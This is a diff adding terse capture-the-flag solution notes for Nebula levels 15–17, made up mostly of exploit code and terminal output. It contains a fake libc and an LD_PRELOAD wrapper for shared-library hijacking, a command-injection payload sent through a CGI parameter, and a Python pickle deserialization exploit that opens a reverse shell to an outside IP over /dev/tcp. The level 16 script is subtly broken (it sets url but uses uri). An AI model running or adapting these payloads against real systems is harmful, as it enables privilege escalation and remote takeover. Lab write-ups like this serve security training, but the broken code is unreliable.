@@ -242,3 +242,102 @@ $ su flag14
 Password:
 sh4.2$ getflag
 You have successfully executed getflag on a target account
+
+#Level 15
+
+level15@nebula:/tmp$ cat wrapper.c
+> #include <unistd.h>
+> 
+> int __wrap_puts(const char *s){
+>     system("/bin/getflag /tmp/flagged");
+>     return puts(s);
+> }
+> level15@nebula:/tmp$ gcc -Wl,-wrap,write -shared -o /tmp/wrapper.so /tmp/wrapper.c
+> level15@nebula:/tmp$ LD_PRELOAD=/tmp/wrapper.so ./flag15
+
+level15@nebula:/home/flag15$ objdump -d -M intel flag15 
+
+level15@nebula:/home/flag15$ cat /tmp/lib.c
+> #include <stdio.h>
+> #include <stdlib.h>
+> 
+> int puts(const char *s){
+>   system("/bin/getflag /tmp/flagged");
+> }
+> 
+> int __libc_start_main(int (*main)(int, char **, char **), 
+>            int argc, char **argv,
+>           void (*init)(void),
+>           void (*fini)(void),
+>           void (*rtld_fini)(void),
+>           void (*stack_end))
+>     { main(argc, argv, NULL);
+>   return 0;
+> }
+level15@nebula:/home/flag15$ 
+level15@nebula:/home/flag15$ gcc -Wall -fPIC -o /tmp/libc.o -c /tmp/lib.c
+/tmp/lib.c: In function ‘puts’:
+/tmp/lib.c:6:1: warning: control reaches end of non-void function [-Wreturn-type]
+level15@nebula:/home/flag15$ gcc -shared -W1,-Bstatic,-soname,libc.so.6 -o /var/tmp/flag15/libc.so.6 /tmp/libc.o -static
+level15@nebula:/home/flag15$ ./flag15
+./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
+./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
+./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __deregister_frame_info, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
+
+> level15@nebula:/home/flag15$ cat /tmp/versionz 
+> GLIBC_2.0{
+>   __cxa_finalize;
+>   __libc_start_main;
+>   puts;
+> };
+> GLIBC_2.1.3 {
+> }GLIBC_2.0;
+> 
+> GLIBC_2.4{
+> }GLIBC_2.0;
+> level15@nebula:/home/flag15$ 
+
+level15@nebula:/home/flag15$ ./flag15
+Segmentation fault
+level15@nebula:/home/flag15$ cat /tmp/flagged
+You have successfully executed getflag on a target account
+level15@nebula:/home/flag15$
+
+#Level 16
+
+> #!/bin/bash
+> # /home/level16/curl
+> echo $1  # sanity check
+> url="http://localhost:1616/index.cgi?username=$1&password=foo"
+> echo $uri
+> curl --globoff $3 "$uri"
+> ls /home/flag16 | grep getflag.log
+
+> #!/bin/bash
+> # /tmp/RUN
+> getflag /home/flag16/getflag.log
+
+$ ~/curl ' "`/*/RUN` %00 '
+$ cat /home/flag16/getflag.log
+You have successfully executed getflag on a target account
+
+
+#Level 17
+
+import socket
+
+cmd = "cos\nsystem\n(S'/bin/bash -i > /dev/tcp/192.168.1.74/5555 0>&1'\ntR.\n"
+try:
+    sock = socket.socket()
+    sock.connect(('192.168.1.206', 10007))
+    data = sock.recv(512)
+    print 'Got: ', data
+    sock.send(cmd)
+    sock.close()
+except Exception, e: print e
+
+#Level 18
+
+
+
+
